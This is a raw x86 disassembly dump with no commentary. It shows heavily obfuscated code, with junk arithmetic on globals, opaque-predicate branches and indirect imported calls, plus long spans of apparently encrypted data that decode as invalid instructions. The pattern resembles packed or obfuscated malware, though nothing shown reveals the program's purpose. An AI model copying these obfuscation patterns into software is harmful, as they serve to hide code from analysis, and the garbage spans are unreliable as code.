  402b81:	mov    DWORD PTR [ebp-0x14],eax
  402b84:	or     ecx,DWORD PTR ds:0x4283fd
  402b8a:	mov    ecx,DWORD PTR [ebx]
  402b8c:	mov    eax,DWORD PTR [ebx+0x4]
  402b8f:	shrd   ecx,eax,0x2
  402b93:	cmp    DWORD PTR ds:0x4282cd,0x0
  402b9a:	mov    DWORD PTR ds:0x428471,0x61cd
  402ba4:	mov    edx,DWORD PTR ds:0x4282d9
  402baa:	mov    DWORD PTR ds:0x4282e5,edx
  402bb0:	jmp    0x402c95
  402bb5:	mov    DWORD PTR ds:0x4282e9,0x124b
  402bbf:	mov    DWORD PTR ds:0x4283c1,0x5ddc
  402bc9:	cmp    DWORD PTR ds:0x4282cd,0x0
  402bd0:	jle    0x402bf9
  402bd6:	push   0x6f74
  402bdb:	call   DWORD PTR ds:0x42e0ac
  402be1:	sub    DWORD PTR ds:0x42848d,edx
  402be7:	and    edx,DWORD PTR ds:0x4283c5
  402bed:	mov    edx,DWORD PTR ds:0x428515
  402bf3:	xor    DWORD PTR ds:0x428465,edx
  402bf9:	mov    edx,DWORD PTR ds:0x428559
  402bff:	mov    edx,DWORD PTR [edx]
  402c01:	xor    DWORD PTR ds:0x4283c9,edx
  402c07:	and    DWORD PTR ds:0x4282ed,0x245f
  402c11:	cmp    DWORD PTR ds:0x4282e1,0x0
  402c18:	mov    DWORD PTR ds:0x428481,0x70c6
  402c22:	not    edx
  402c24:	mov    edx,0x462e
  402c29:	jmp    0x402c95
  402c2e:	mov    DWORD PTR ds:0x428421,edx
  402c34:	cmp    DWORD PTR ds:0x4282e1,0x0
  402c3b:	jl     0x402c5f
  402c41:	push   DWORD PTR [ebp-0x18]
  402c44:	push   0x2a6e
  402c49:	call   DWORD PTR ds:0x42e240
  402c4f:	sbb    DWORD PTR ds:0x4282e1,0x59bd
  402c59:	sub    edx,0x641d
  402c5f:	sbb    DWORD PTR ds:0x4282e9,0x4284a1
  402c69:	sbb    DWORD PTR ds:0x428485,0x27b0
  402c73:	mov    edx,DWORD PTR ds:0x42844d
  402c79:	mov    edx,DWORD PTR [edx]
  402c7b:	adc    DWORD PTR ds:0x4283a5,edx
  402c81:	xor    DWORD PTR ds:0x4283f5,0x4283c1
  402c8b:	sbb    DWORD PTR ds:0x428411,0x33ea
  402c95:	shr    eax,0x2
  402c98:	cmp    DWORD PTR ds:0x4283e5,0x0
  402c9f:	mov    DWORD PTR ds:0x428501,0x384
  402ca9:	mov    DWORD PTR ds:0x4282e5,0x2b95
  402cb3:	mov    edx,DWORD PTR ds:0x4284e9
  402cb9:	mov    DWORD PTR ds:0x4284a1,edx
  402cbf:	jmp    0x402d0e
  402cc4:	mov    eax,0x220e
  402cc9:	mov    DWORD PTR ds:0x42848d,0x7b53
  402cd3:	cmp    DWORD PTR ds:0x4283e5,0x0
  402cda:	jbe    0x402d06
  402ce0:	push   0x3c7e
  402ce5:	push   0x1ff0
  402cea:	call   DWORD PTR ds:0x42e0b0
  402cf0:	sub    edx,0x6132
  402cf6:	sbb    DWORD PTR ds:0x4284a1,0x612a
  402d00:	sbb    DWORD PTR ds:0x428505,ecx
  402d06:	dec    edx
  402d07:	inc    edx
  402d08:	and    edx,DWORD PTR ds:0x428505
  402d0e:	mov    eax,DWORD PTR [ebx]
  402d10:	mov    edx,DWORD PTR [ebx+0x4]
  402d13:	dec    DWORD PTR ds:0x4283a5
  402d19:	xor    ecx,edi
  402d1b:	shl    eax,0x1e
  402d1e:	xor    edx,0x1700
  402d24:	xor    eax,eax
  402d26:	sub    edx,0x11fc
  402d2c:	or     eax,ecx
  402d2e:	mov    ecx,DWORD PTR [ebx]
  402d30:	cmp    DWORD PTR ds:0x4284a1,0x0
  402d37:	mov    DWORD PTR ds:0x428409,0x400c
  402d41:	mov    edx,DWORD PTR ds:0x4283cd
  402d47:	mov    edx,DWORD PTR ds:0x42849d
  402d4d:	jmp    0x402d9d
  402d52:	mov    DWORD PTR ds:0x4283f1,0x114
  402d5c:	cmp    DWORD PTR ds:0x4284a1,0x0
  402d63:	je     0x402d85
  402d69:	push   DWORD PTR [ebp-0x24]
  402d6c:	call   DWORD PTR ds:0x42e0b4
  402d72:	dec    edx
  402d73:	xor    edx,DWORD PTR ds:0x4284f9
  402d79:	or     DWORD PTR ds:0x4283d9,ebx
  402d7f:	sub    DWORD PTR ds:0x42849d,ecx
  402d85:	mov    edx,DWORD PTR ds:0x4284ed
  402d8b:	xor    DWORD PTR ds:0x42848d,edx
  402d91:	xor    edx,0x442c
  402d97:	not    DWORD PTR ds:0x4282dd
  402d9d:	mov    edx,DWORD PTR [ebx+0x4]
  402da0:	add    DWORD PTR ds:0x4283d9,0x4283b9
  402daa:	shrd   ecx,edx,0x2
  402dae:	shr    edx,0x2
  402db1:	mov    DWORD PTR [ebp-0x1c],ecx
  402db4:	sbb    edx,DWORD PTR ds:0x4284a1
  402dba:	mov    ecx,DWORD PTR [ebx]
  402dbc:	mov    edx,DWORD PTR ds:0x428421
  402dc2:	xor    DWORD PTR ds:0x42848d,edx
  402dc8:	mov    edx,DWORD PTR [ebx+0x4]
  402dcb:	xor    DWORD PTR [ebp-0x1c],edi
  402dce:	and    DWORD PTR ds:0x428411,0x4abe
  402dd8:	xor    edx,edx
  402dda:	sub    DWORD PTR ds:0x4283b1,0x1446
  402de4:	or     edx,DWORD PTR [ebp-0x1c]
  402de7:	shl    ecx,0x1e
  402dea:	lea    ecx,[edx+eax*1]
  402ded:	mov    edx,DWORD PTR ds:0x4284cd
  402df3:	xor    eax,eax
  402df5:	xor    eax,DWORD PTR ds:0x428559
  402dfb:	sub    edx,eax
  402dfd:	add    edx,DWORD PTR [edx+eax*1]
  402e00:	mov    eax,DWORD PTR [ebx]
  402e02:	xor    DWORD PTR ds:0x428511,ecx
  402e08:	mov    edx,DWORD PTR [ebx+0x4]
  402e0b:	or     DWORD PTR ds:0x4283ad,0x3bc
  402e15:	shrd   eax,edx,0x2
  402e19:	shr    edx,0x2
  402e1c:	cmp    DWORD PTR ds:0x42851d,0x0
  402e23:	mov    DWORD PTR ds:0x42840d,ebx
  402e29:	mov    DWORD PTR ds:0x428411,0x656f
  402e33:	movzx  edx,BYTE PTR ds:0x4283b9
  402e3a:	jmp    0x402e93
  402e3f:	mov    DWORD PTR ds:0x4283dd,0x5c7
  402e49:	mov    DWORD PTR ds:0x42841d,0x3013
  402e53:	cmp    DWORD PTR ds:0x42851d,0x0
  402e5a:	jle    0x402e7f
  402e60:	push   DWORD PTR [ebp-0x24]
  402e63:	call   DWORD PTR ds:0x42e0b8
  402e69:	sub    DWORD PTR ds:0x4282f1,0x7db0
  402e73:	sub    DWORD PTR ds:0x428521,ecx
  402e79:	adc    DWORD PTR ds:0x4283ad,edx
  402e7f:	and    edx,DWORD PTR ds:0x428489
  402e85:	mov    edx,DWORD PTR ds:0x42833d
  402e8b:	mov    edx,DWORD PTR [edx]
  402e8d:	xor    DWORD PTR ds:0x42830d,edx
  402e93:	mov    DWORD PTR [ebp-0x1c],eax
  402e96:	not    DWORD PTR ds:0x4283f1
  402e9c:	mov    eax,DWORD PTR [ebx]
  402e9e:	add    DWORD PTR ds:0x428489,0x4968
  402ea8:	jmp    0x403249
  402ead:	cmp    al,0xdc
  402eaf:	(bad)  
  402eb0:	inc    ebp
  402eb1:	ss dec ebx
  402eb3:	mov    esp,0x8c100abc
  402eb8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402eb9:	cs and bl,BYTE PTR ss:[esi-0x41411f43]
  402ec1:	mov    ebp,0x57bebec4
  402ec6:	xchg   edi,eax
  402ec7:	push   esi
  402ec8:	mov    edi,DWORD PTR [esi-0x29]
  402ecb:	scas   eax,DWORD PTR es:[edi]
  402ecc:	dec    edx
  402ecd:	imul   ecx,ecx,0x468ba65c
  402ed3:	(bad)  
  402ed4:	rcr    edi,cl
  402ed6:	mov    ds:0x46ba7d18,eax
  402edb:	xchg   esp,eax
  402edc:	aaa    
  402edd:	fpatan 
  402edf:	in     al,dx
  402ee0:	mov    eax,ds:0x6b10a95b
  402ee5:	jge    0x402edf
  402ee7:	(bad)  
  402ee8:	lea    esi,[eax+edi*8]
  402eeb:	jl     0x402f3c
  402eed:	cli    
  402eee:	xor    DWORD PTR [edx+eax*1+0x19],eax
  402ef2:	jo     0x402f2a
  402ef4:	(bad)
  402ef8:	mov    WORD PTR gs:[ecx+0x49],ds
  402efc:	retf   
  402efd:	xchg   DWORD PTR [ebx+ebx*8],esi
  402f00:	xchg   ecx,eax
  402f01:	jmp    0x402eff
  402f03:	push   esp
  402f04:	or     al,0x55
  402f06:	add    al,BYTE PTR [esi+0x407dd608]
  402f0c:	in     eax,0x97
  402f0e:	into   
  402f0f:	pop    edi
  402f10:	push   esi
  402f11:	retf   
  402f12:	and    BYTE PTR [eax+0x24],bl
  402f15:	shr    ecx,0xa2
  402f18:	hlt    
  402f19:	jae    0x402eb5
  402f1b:	sti    
  402f1c:	shl    BYTE PTR [edx],0x3e
  402f1f:	frstor [edx+0x1c1eeb10]
  402f25:	retf   
  402f26:	pop    ebx
  402f27:	jae    0x402ece
  402f29:	(bad)  
  402f2a:	cwde   
  402f2b:	or     al,0xeb
  402f2d:	sbb    edi,ebx
  402f2f:	fnsave [esi]
  402f31:	pushf  
  402f32:	mov    bh,0x2e
  402f34:	aad    0x98
  402f36:	out    dx,eax
  402f37:	lock fisubr WORD PTR [esi-0x6afa6a84]
  402f3e:	dec    ecx
  402f3f:	mov    ebp,0x9832ce5d
  402f44:	or     BYTE PTR [ebx+0xe],0xb0
  402f48:	mov    BYTE PTR [edi-0x18e05b62],al
  402f4e:	fdiv   st,st(7)
  402f50:	add    DWORD PTR [esi],ebp
  402f52:	xchg   edi,eax
  402f53:	shl    al,0x3d
  402f56:	frstor [edi]
  402f58:	pusha  
  402f59:	push   ebx
  402f5a:	push   ebp
  402f5b:	mov    WORD PTR [di+0x39],cs
  402f5f:	aas    
  402f60:	sbb    BYTE PTR [esi-0xa01208c],0x66
  402f67:	and    bl,BYTE PTR [ecx+0x63]
  402f6a:	scas   al,BYTE PTR es:[edi]
  402f6b:	lahf   
  402f6c:	cld    
  402f6d:	ror    al,cl
  402f6f:	fucom  st(5)
  402f71:	push   edi
  402f72:	push   es
  402f73:	sbb    eax,0x53a6f1f9
  402f78:	hlt    
  402f79:	adc    BYTE PTR [edx+0x7f],cl
  402f7c:	fs mov dh,0xc8
  402f7f:	pop    edx
  402f80:	xchg   ebx,eax
  402f81:	push   esi
  402f82:	or     al,0xe0
  402f84:	loop   0x402fbd
  402f86:	dec    ecx
  402f87:	mov    al,BYTE PTR [edi]
  402f89:	rcr    cl,1
  402f8b:	std    
  402f8c:	jl     0x402f59
  402f8e:	ja     0x402fae
  402f90:	push   ebp
  402f91:	das    
  402f92:	fistp  DWORD PTR [esi+0x75c38342]
  402f98:	bound  edx,QWORD PTR [ecx+edi*1]
  402f9b:	mov    eax,ds:0x2460fa2e
  402fa0:	ficom  DWORD PTR ds:0x3d8985c5
  402fa6:	lods   eax,DWORD PTR ds:[esi]
  402fa7:	neg    BYTE PTR [ebp+0x60]
  402faa:	inc    edx
  402fab:	jge    0x402f6d
  402fad:	das    
  402fae:	aad    0x8c
  402fb0:	fs es out dx,eax
  402fb3:	or     dh,BYTE PTR [ebx+0x32995de6]
  402fb9:	outs   dx,DWORD PTR ds:[esi]
  402fba:	xor    bl,BYTE PTR [edx]
  402fbc:	xchg   ecx,eax
  402fbd:	ins    DWORD PTR es:[edi],dx
  402fbe:	sbb    BYTE PTR [esi+0x52],bh
  402fc1:	and    BYTE PTR [ebx+0x2f],cl
  402fc4:	lea    ecx,[esp+eiz*2+0x5e0157a8]
  402fcb:	repnz or bh,bh
  402fce:	push   ss
  402fcf:	adc    DWORD PTR [esp+esi*1],0xffffffb9
  402fd3:	js     0x402fb8
  402fd5:	ins    BYTE PTR es:[edi],dx
  402fd6:	into   
  402fd7:	mov    ch,0xb6
  402fd9:	cmp    DWORD PTR [bx+si+0x5f],eax
  402fdd:	mov    dh,0x79
  402fdf:	mov    ebx,0x6ae345b3
  402fe4:	adc    eax,DWORD PTR [edi]
  402fe6:	mov    ebp,esi
  402fe8:	(bad)  
  402fe9:	fld    QWORD PTR [ebp+0x28]
  402fec:	xor    DWORD PTR [ecx-0x69],ebp
  402fef:	gs push ebx
  402ff1:	in     al,0x14
  402ff3:	jbe    0x403021
  402ff5:	lahf   
  402ff6:	jnp    0x40300a
  402ff8:	sbb    cl,BYTE PTR [edx-0x7470a441]
  402ffe:	dec    ebx
  402fff:	jbe    0x402fdd
  403001:	xor    dh,cl
  403003:	fwait
  403004:	mov    ecx,0x8c861bbb
  403009:	stos   DWORD PTR es:[edi],eax
  40300a:	push   ss
  40300b:	stos   DWORD PTR es:[edi],eax
  40300c:	pop    es
  40300d:	gs mov ecx,0x1c37f0ba
  403013:	or     eax,0xed1e6dd3
  403018:	(bad)  
  40301a:	adc    al,0x53
  40301c:	loopne 0x403011
  40301e:	dec    edi
  40301f:	mov    edi,0xd90fc1e9
  403024:	mov    eax,ds:0xdbc70d0f
  403029:	sbb    esp,ebp
  40302b:	mov    esi,0xe0f5a32e
  403030:	adc    BYTE PTR [ecx+ebp*2],dh
  403033:	(bad)  [ebx-0x1f]
  403036:	adc    eax,0xdc9d00e0
  40303b:	and    esp,DWORD PTR [edx]
  40303d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40303e:	stc    
  40303f:	xor    BYTE PTR ds:0x6db79aa0,0xbe
  403046:	jmp    0xac749e99
  40304b:	(bad)  
  40304c:	(bad)  
  40304d:	clc    
  40304e:	xor    al,0x2b
  403050:	ret    0x5e20
  403053:	dec    esp
  403054:	or     esi,DWORD PTR [ebp+0xb]
  403057:	xchg   ebp,eax
  403058:	sub    eax,0xad572780
  40305d:	in     eax,0x28
  40305f:	and    ah,BYTE PTR [eax-0x791b6555]
  403065:	xchg   DWORD PTR [ebp+0xb],esp
  403068:	xor    eax,0x29eda83f
  40306d:	pusha  
  40306e:	jl     0x403017
  403070:	sub    DWORD PTR [eax+0x24],edx
  403073:	stc    
  403074:	inc    esi
  403075:	(bad)  
  403077:	mov    ch,0xbe
  403079:	cmp    al,0x3e
  40307b:	pop    ss
  40307c:	loop   0x40300c
  40307e:	adc    ecx,edx
  403080:	pusha  
  403081:	sub    BYTE PTR [ebp+0x13ef7ab2],0x47
  403088:	mov    bh,0xdc
  40308a:	jno    0x4030c2
  40308c:	push   esp
  40308d:	popf   
  40308e:	inc    esi
  40308f:	jmp    0x43a7aa03
  403094:	in     al,dx
  403095:	mov    al,ah
  403097:	mov    dh,0xe6
  403099:	les    eax,FWORD PTR [edx-0x68]
  40309c:	retf   0x3424
  40309f:	lods   eax,DWORD PTR ds:[esi]
  4030a0:	pop    esi
  4030a1:	outs   dx,BYTE PTR ds:[esi]
  4030a2:	jne    0x403064
  4030a4:	sub    ebx,DWORD PTR [edi+0x13]
  4030a7:	adc    al,0xb2
  4030a9:	repz jnp 0x40302e
  4030ac:	out    dx,al
  4030ad:	add    ecx,0xc15d9984
  4030b3:	test   DWORD PTR [edx+ebp*1],edx
  4030b6:	inc    ecx
  4030b7:	xchg   DWORD PTR [esi+0x37317f17],esp
  4030bd:	xchg   ecx,eax
  4030be:	jmp    0x403123
  4030c0:	fcmovu st,st(4)
  4030c2:	outs   dx,BYTE PTR ds:[esi]
  4030c3:	pop    ebp
  4030c4:	jmp    0x764e2289
  4030c9:	pop    es
  4030ca:	dec    esp
  4030cb:	aas    
  4030cc:	cmp    al,0xde
  4030ce:	out    dx,al
  4030cf:	push   es
  4030d0:	inc    esp
  4030d1:	xchg   ecx,eax
  4030d2:	sub    ebp,DWORD PTR [ebx+0x42]
  4030d5:	popa   
  4030d6:	add    ax,0x5d9f
  4030da:	mov    edi,0xc0a00b2b
  4030df:	and    edi,edx
  4030e1:	fcmovnb st,st(2)
  4030e3:	dec    edi
  4030e4:	mov    ebp,0xd0bd2330
  4030e9:	push   ss
  4030ea:	gs xchg edx,eax
  4030ec:	lds    edi,FWORD PTR ds:0xcbd38e96
  4030f2:	jecxz  0x403125
  4030f4:	xchg   DWORD PTR [eax-0xa2ac5fb],ebp
  4030fa:	mov    esi,0xc7b60222
  4030ff:	xchg   ebp,eax
  403100:	in     al,0x47
  403102:	sbb    BYTE PTR [ebx],dl
  403104:	jmp    0xd2cd:0xfea9dd23
  40310b:	dec    esi
  40310c:	leave  
  40310d:	nop
  40310e:	mov    edi,0x4882ed17
  403113:	mul    BYTE PTR [eax]
  403115:	les    eax,FWORD PTR [edi]
  403117:	in     al,dx
  403118:	push   eax
  403119:	into   
  40311a:	(bad)
  40311d:	fldenv [edi-0x6486c9]
  403123:	dec    ah
  403125:	test   eax,0x4e6b73e
  40312a:	lods   al,BYTE PTR ds:[esi]
  40312b:	push   ebp
  40312c:	pop    ebx
  40312d:	adc    BYTE PTR [ecx],bl
  40312f:	aaa    
  403130:	ret    0x6b46
  403133:	popa   
  403134:	out    0x33,eax
  403136:	cmc    
  403137:	fs lahf 
  403139:	adc    BYTE PTR [edx],al
  40313b:	out    0xf9,eax
  40313d:	mov    al,0x74
  40313f:	dec    esi
  403140:	add    ebp,DWORD PTR [ebp+0x28]
  403143:	mov    ecx,0xbbd462ae
  403148:	aad    0x5f
  40314a:	loopne 0x40312c
  40314c:	loope  0x4031cb
  40314e:	push   esi
  40314f:	inc    esp
  403150:	out    dx,eax
  403151:	add    ah,ah
  403153:	xor    BYTE PTR ds:0xecb2f99c,al
  403159:	cmp    al,0x55
  40315b:	cwde   
  40315c:	int3   
  40315d:	mov    eax,0xd72e4ccf
  403162:	lds    edi,FWORD PTR [eax+0x440e404d]
  403168:	and    BYTE PTR [ecx+0x4c],bh
  40316b:	jecxz  0x4031e8
  40316d:	add    DWORD PTR [edi],eax
  40316f:	stos   DWORD PTR es:[edi],eax
  403170:	or     al,0x78
  403172:	cs (bad) 
  403174:	lock stos BYTE PTR es:[edi],al
  403176:	jmp    0x403143
  403178:	outs   dx,BYTE PTR ds:[esi]
  403179:	jb     0x4031e1
  40317b:	push   ecx
  40317c:	mov    dh,0xa4
  40317e:	xchg   esp,eax
  40317f:	fadd   QWORD PTR [edi-0x9]
  403182:	mov    esp,0x9bf301b1
  403187:	fadd   QWORD PTR ss:[eax]
  40318a:	repnz aas 
  40318c:	dec    ecx
  40318d:	pop    edi
  40318e:	imul   edx,DWORD PTR [edi+0x3d28f3e1],0xffffffba
  403195:	lods   eax,DWORD PTR ds:[esi]
  403196:	dec    edi
  403197:	lahf   
  403198:	jns    0x4031af
  40319a:	call   0xca82e1e8
  40319f:	jmp    FWORD PTR [esi]
  4031a1:	mov    bh,0x51
  4031a3:	adc    eax,0x69cdadcf
  4031a8:	shl    BYTE PTR [esp+eax*8],cl
  4031ab:	and    al,0x30
  4031ad:	popf   
  4031ae:	out    dx,al
  4031af:	out    0x50,al
  4031b1:	cmp    al,dh
  4031b3:	loope  0x403159
  4031b5:	push   0xb38632de
  4031ba:	mov    dl,0xf1
  4031bc:	(bad)  [ecx+eiz*8+0x6d099a91]
  4031c3:	adc    BYTE PTR [ebx+ebx*2],cl
  4031c6:	push   cs
  4031c7:	jno    0x4031fd
  4031c9:	inc    edi
  4031ca:	jne    0x40324a
  4031cc:	iret   
  4031cd:	lock dec ebx
  4031cf:	popf   
  4031d0:	mov    al,0xb7
  4031d2:	and    al,0x7b
  4031d4:	pop    ebx
  4031d5:	add    BYTE PTR [edi+ebp*1],al
  4031d8:	jae    0x403176
  4031da:	jmp    0x403214
  4031dc:	xchg   ah,dh
  4031de:	jne    0x40319a
  4031e0:	pop    edi
  4031e1:	(bad)  
  4031e2:	jnp    0x4031bc
  4031e4:	mov    DWORD PTR gs:[ebp+0x7c],esp
  4031e8:	add    BYTE PTR [esi+0xa770d67],bh
  4031ee:	out    dx,eax
  4031ef:	dec    esp
  4031f0:	mov    BYTE PTR [ecx+eiz*4+0xcb4899d],al
  4031f7:	mov    eax,ds:0x1cc5f7b3
  4031fc:	neg    ecx
  4031fe:	dec    esi
  4031ff:	cmp    eax,DWORD PTR [esi]
  403201:	push   0xffffffe5
  403203:	sub    ch,0xb2
  403206:	mov    dl,0x71
  403208:	jne    0x40327e
  40320a:	sbb    al,0xd3
  40320c:	mov    dl,cl
  40320e:	into   
  40320f:	push   0x18
  403211:	idiv   DWORD PTR [edi]
  403213:	test   DWORD PTR [ecx+0x4],ebx
  403216:	sbb    esi,0x1fb7c5a5
  40321c:	pop    ecx
  40321d:	push   ss
  40321e:	addr16 dec ebp
  403220:	pop    ebp
  403221:	jmp    0x403280
  403223:	or     esp,esi
  403225:	cmc    
  403226:	imul   ecx,DWORD PTR [esi+edi*2+0x3d161fab],0x55
  40322e:	xchg   esp,eax
  40322f:	mov    edx,0xb428ddd7
  403234:	pop    ss
  403235:	jmp    0x5360fbfc
  40323a:	mov    ah,0x67
  40323c:	mov    cl,dl
  40323e:	in     eax,dx
  40323f:	cmp    BYTE PTR [edi-0x2],ah
  403242:	rcr    BYTE PTR [ebx+0x53],0x98
  403246:	nop
  403247:	mov    BYTE PTR [edi-0x75],ch
  40324a:	push   ebx
  40324b:	add    al,0x31
  40324d:	jge    0x403233
  40324f:	sub    DWORD PTR ds:0x428479,ebx
  403255:	mov    edx,eax
  403257:	sub    DWORD PTR ds:0x428519,0x4282fd
  403261:	xor    eax,eax
  403263:	or     eax,DWORD PTR [ebp-0x1c]
  403266:	shl    edx,0x1e
  403269:	mov    edx,DWORD PTR ds:0x4283f9
  40326f:	xor    DWORD PTR ds:0x4283ad,edx
  403275:	imul   eax,ecx
  403278:	sub    DWORD PTR ds:0x428499,0x4172
  403282:	mov    ecx,DWORD PTR [ebx]
  403284:	add    edx,0x41d1
  40328a:	mov    edx,DWORD PTR [ebx+0x4]
  40328d:	shrd   ecx,edx,0x2
  403291:	mov    DWORD PTR [ebp-0x1c],ecx
  403294:	mov    ecx,DWORD PTR [ebx]
  403296:	or     DWORD PTR ds:0x428469,0x42b9
  4032a0:	xor    DWORD PTR [ebp-0x1c],edi
  4032a3:	mov    DWORD PTR ds:0x4284f5,0x397a
  4032ad:	shr    edx,0x2
  4032b0:	cmp    DWORD PTR ds:0x4284fd,0x0
  4032b7:	mov    DWORD PTR ds:0x428491,0x7cee
  4032c1:	mov    edx,DWORD PTR ds:0x4283a5
  4032c7:	jmp    0x403370
  4032cc:	mov    DWORD PTR ds:0x4282fd,0x3170
  4032d6:	cmp    DWORD PTR ds:0x4284fd,0x0
  4032dd:	jge    0x403302
  4032e3:	push   DWORD PTR [ebp-0x28]
  4032e6:	call   DWORD PTR ds:0x42e244
  4032ec:	add    edx,DWORD PTR ds:0x4283bd
  4032f2:	sub    edx,0x765a
  4032f8:	xor    DWORD PTR ds:0x428475,0x290
  403302:	sbb    DWORD PTR ds:0x4283b1,edi
  403308:	inc    edx
  403309:	not    edx
  40330b:	cmp    DWORD PTR ds:0x428491,0x0
  403312:	mov    edx,DWORD PTR ds:0x4283d1
  403318:	mov    DWORD PTR ds:0x42846d,0x501f
  403322:	mov    edx,DWORD PTR ds:0x428471
  403328:	jmp    0x403370
  40332d:	mov    DWORD PTR ds:0x428315,0x1634
  403337:	mov    DWORD PTR ds:0x428489,0xaef
  403341:	cmp    DWORD PTR ds:0x428491,0x0
  403348:	jb     0x403364
  40334e:	call   DWORD PTR ds:0x42e0bc
  403354:	adc    DWORD PTR ds:0x4283d1,0x42841d
  40335e:	adc    edx,0x2d88
  403364:	and    edx,0x4ab7
  40336a:	sub    edx,DWORD PTR ds:0x4283b1
  403370:	mov    edx,DWORD PTR [ebx+0x4]
  403373:	or     edx,DWORD PTR ds:0x428489
  403379:	mov    edx,ecx
  40337b:	add    DWORD PTR ds:0x428305,0x428479
  403385:	xor    ecx,ecx
  403387:	adc    DWORD PTR ds:0x4282d5,0x4283f5
  403391:	or     ecx,DWORD PTR [ebp-0x1c]
  403394:	sub    DWORD PTR ds:0x4283ed,0x6b10
  40339e:	shl    edx,0x1e
  4033a1:	add    DWORD PTR ds:0x4282dd,ebx
  4033a7:	sub    ecx,eax
  4033a9:	mov    DWORD PTR ds:0x4283a9,0x9e0
  4033b3:	mov    eax,DWORD PTR [ebp-0xc]
  4033b6:	cmp    DWORD PTR [eax],ecx
  4033b8:	mov    DWORD PTR ds:0x428509,0x2658
  4033c2:	mov    eax,DWORD PTR [ebp-0xc]
  4033c5:	mov    ecx,DWORD PTR [ebp+0x18]
  4033c8:	mov    edx,DWORD PTR ds:0x428301
  4033ce:	mov    edx,DWORD PTR [ebp+0x1c]
  4033d1:	jg     0x4038e5
  4033d7:	and    DWORD PTR ds:0x428511,0xf14
  4033e1:	shrd   ecx,edx,0x2
  4033e5:	xor    DWORD PTR ds:0x4283d9,0x4283d1
  4033ef:	mov    DWORD PTR [ebp-0x1c],ecx
  4033f2:	xor    DWORD PTR ds:0x428305,edi
  4033f8:	mov    ecx,DWORD PTR [ebp+0x18]
  4033fb:	xor    DWORD PTR [ebp-0x1c],edi
  4033fe:	shl    ecx,0x1e
  403401:	mov    DWORD PTR ds:0x4283b5,0x71ad
  40340b:	xor    ecx,ecx
  40340d:	or     ecx,DWORD PTR [ebp-0x1c]
  403410:	shr    edx,0x2
  403413:	sub    DWORD PTR ds:0x42849d,0x3b82
  40341d:	mov    edx,DWORD PTR [ebp+0x1c]
  403420:	cmp    DWORD PTR ds:0x428471,0x0
  403427:	mov    DWORD PTR ds:0x428501,0xe2a
  403431:	mov    DWORD PTR ds:0x4282e9,ecx
  403437:	mov    edx,0x4d53
  40343c:	jmp    0x4034b7
  403441:	mov    DWORD PTR ds:0x428515,0xfd5
  40344b:	mov    DWORD PTR ds:0x4283e9,ecx
  403451:	cmp    DWORD PTR ds:0x428471,0x0
  403458:	jae    0x4034a5
  40345e:	push   DWORD PTR [ebp-0x1c]
  403461:	push   0x633e
  403466:	push   0x428207
  40346b:	push   DWORD PTR [ebp-0x1c]
  40346e:	push   DWORD PTR [ebp-0xc]
  403471:	push   DWORD PTR [ebp-0x20]
  403474:	push   DWORD PTR [ebp-0x24]
  403477:	push   0x6c89
  40347c:	call   DWORD PTR ds:0x42dff4
  403482:	movzx  edx,WORD PTR ds:0x4283cd
  403489:	sub    edx,DWORD PTR ds:0x428485
  40348f:	mov    DWORD PTR ds:0x4283cd,edx
  403495:	mov    DWORD PTR ds:0x428301,0x6c8
  40349f:	sbb    edx,DWORD PTR ds:0x42830d
  4034a5:	mov    edx,DWORD PTR ds:0x42851d
  4034ab:	and    DWORD PTR ds:0x4283d5,edx
  4034b1:	inc    DWORD PTR ds:0x4282cd
  4034b7:	mov    DWORD PTR [ebp-0x2c],ecx
  4034ba:	xor    DWORD PTR ds:0x4282e5,0x3285
  4034c4:	mov    ecx,DWORD PTR [ebx]
  4034c6:	mov    edx,DWORD PTR [ebx+0x4]
  4034c9:	and    DWORD PTR ds:0x4284e9,0x4bb1
  4034d3:	shrd   ecx,edx,0x2
  4034d7:	mov    DWORD PTR ds:0x4283c9,0x325c
  4034e1:	shr    edx,0x2
  4034e4:	add    DWORD PTR ds:0x428481,0x68a9
  4034ee:	mov    DWORD PTR [ebp-0x1c],ecx
  4034f1:	sub    DWORD PTR ds:0x428421,ebx
  4034f7:	mov    ecx,DWORD PTR [ebx]
  4034f9:	sub    DWORD PTR ds:0x428409,0x42848d
  403503:	mov    edx,DWORD PTR [ebx+0x4]
  403506:	xor    DWORD PTR [ebp-0x1c],edi
  403509:	sub    DWORD PTR ds:0x4282e9,0x428301
  403513:	xor    edx,edx
  403515:	or     edx,DWORD PTR [ebp-0x1c]
  403518:	add    DWORD PTR ds:0x4282e1,0x71c0
  403522:	shl    ecx,0x1e
  403525:	adc    DWORD PTR ds:0x428491,0x428411
  40352f:	imul   edx,DWORD PTR [ebp-0x2c]
  403533:	and    DWORD PTR ds:0x4283ed,0x15cd
  40353d:	sub    DWORD PTR [eax],edx
  40353f:	jmp    0x4041b5
  403544:	jmp    0x4038e5
  403549:	pop    ss
  40354a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40354b:	out    0xaf,eax
  40354d:	js     0x4034ff
  40354f:	cwde   
  403550:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403551:	retf   
  403552:	mov    ch,0x34
  403554:	fnsave [ecx+0x4]
  403557:	dec    edx
  403558:	xchg   edx,eax
  403559:	mov    esi,0xbdbebee8
  40355e:	les    edi,FWORD PTR [esi-0xa1db742]
  403564:	fiadd  DWORD PTR [esi+esi*1+0x39]
  403568:	dec    ebx
  403569:	sub    al,0x7f
  40356b:	call   0x5e1b5df4
  403570:	shl    DWORD PTR [ecx-0x6d6ed7a2],cl
  403576:	aaa    
  403577:	cmp    bh,bl
  403579:	jmp    0x6b36:0xa0a9b5e3
  403580:	lahf   
  403581:	sub    eax,0xe11ea280
  403586:	xchg   ebp,eax
  403587:	ds fnsave ds:[eax-0x5db393e6]
  40358f:	in     eax,dx
  403590:	push   ecx
  403591:	div    DWORD PTR [esi+0x7d]
  403594:	int    0xec
  403596:	inc    ecx
  403597:	jbe    0x40358e
  403599:	dec    esp
  40359a:	mov    ah,0x12
  40359c:	mov    DWORD PTR [esp+edx*8-0x71d73fd7],esp
  4035a3:	pushf  
  4035a4:	sbb    ebx,0xffffff92
  4035a7:	pop    eax
  4035a8:	push   es
  4035a9:	jle    0x403607
  4035ab:	rcr    DWORD PTR [ebx+edx*4-0x32],cl
  4035af:	jmp    0x403586
  4035b1:	push   esp
  4035b2:	jmp    0xe916:0xa378c5a4
  4035b9:	imul   ebx,edi,0xffffffa2
  4035bc:	ret    
  4035bd:	jecxz  0x40361e
